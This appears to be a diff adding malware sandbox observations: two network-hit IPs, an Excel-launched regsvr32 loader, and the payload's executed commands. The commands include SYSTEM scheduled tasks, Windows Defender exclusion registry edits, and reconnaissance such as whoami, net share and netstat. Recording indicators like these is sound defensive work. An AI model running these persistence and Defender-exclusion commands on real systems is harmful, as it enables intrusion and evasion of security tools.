@@ -19,5 +19,101 @@ EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\1c7829f0316c7aeb94e0887bedf93e3667ab
 
 regsvr32  C:\a\Gertiokas1.ocx
 
+******************************
+
+Network Hits:
+
+https://185.249.85.209/t4
+https://144.202.2.175/t4
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\1c7829f0316c7aeb94e0887bedf93e3667ab1283659bb1e3d5bcb2860d609ec1.xlsb
+
+regsvr32  C:\a\Gertiokas1.ocx
+
 *************************************************
+
+.dll exec
+
+C:\Windows\system32\schtasks.exe" /Create /RU "NT AUTHORITY\SYSTEM" /tn izgntmfqgo /tr "regsvr32.exe -s \"C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll\"" /SC ONCE /Z /ST 16:27 /ET 16:39
+
+taskeng.exe {DC717AEB-FBFE-43A2-9DE0-29BE60B3019B} S-1-5-18:NT AUTHORITY\System:Service:
+
+regsvr32.exe -s "C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll"
+
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Mairrkitevaj" /d "0"
+
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\Users\Admin\AppData\Roaming\Microsoft\Bourfbyal" /d "0"
+
+*************************************************
+x2 .dll exec 
+
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll,#1
+
+C:\Windows\SysWOW64\explorer.exe
+
+C:\Windows\system32\schtasks.exe" /Create /RU "NT AUTHORITY\SYSTEM" /tn pkjjrwxj /tr "regsvr32.exe -s \"C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll\"" /SC ONCE /Z /ST 16:32 /ET 16:44
+
+C:\Windows\SysWOW64\whoami.exe whoami /all
+
+C:\Windows\SysWOW64\cmd.exe cmd /c set
+
+C:\Windows\SysWOW64\arp.exe arp -a
+
+C:\Windows\SysWOW64\ipconfig.exe ipconfig /all
+
+C:\Windows\SysWOW64\net.exe net view /all
+
+C:\Windows\SysWOW64\nslookup.exe nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.WORKGROUP
+
+C:\Windows\SysWOW64\net.exe net share
+
+C:\Windows\SysWOW64\net1.exe C:\Windows\system32\net1 share
+
+C:\Windows\SysWOW64\route.exe route print
+
+C:\Windows\SysWOW64\netstat.exe netstat -nao
+
+C:\Windows\SysWOW64\net.exe net localgroup
+
+C:\Windows\SysWOW64\net1.exe C:\Windows\system32\net1 localgroup
+
+taskeng.exe {E499D8BD-D1AC-4BD1-A496-3C75F05A2680} S-1-5-18:NT AUTHORITY\System:Service:
+
+C:\Windows\system32\regsvr32.exe regsvr32.exe -s "C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll"
+P
+C:\Windows\SysWOW64\regsvr32.exe -s "C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll"
+
+C:\Windows\SysWOW64\explorer.exe
+
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Djqyxkquei" /d "0"
+
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\Users\Admin\AppData\Roaming\Microsoft\Eypqhosmv" /d "0"
+
+C:\Windows\SysWOW64\whoami.exe whoami /all
+
+C:\Windows\SysWOW64\cmd.exe cmd /c set
+
+C:\Windows\SysWOW64\arp.exe arp -a
+
+C:\Windows\SysWOW64\ipconfig.exe ipconfig /all
+
+C:\Windows\SysWOW64\net.exe net view /all
+
+C:\Windows\SysWOW64\nslookup.exe nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.WORKGROUP
+
+C:\Windows\SysWOW64\net.exe net share
+
+C:\Windows\SysWOW64\net1.exe C:\Windows\system32\net1 share
+
+C:\Windows\SysWOW64\route.exe route print
+
+C:\Windows\SysWOW64\netstat.exe netstat -nao
+
+C:\Windows\SysWOW64\net.exe net localgroup
+
+C:\Windows\SysWOW64\net1.exe C:\Windows\system32\net1 localgroup
+
+C:\Windows\system32\msiexec.exe C:\Windows\system32\msiexec.exe /V
 
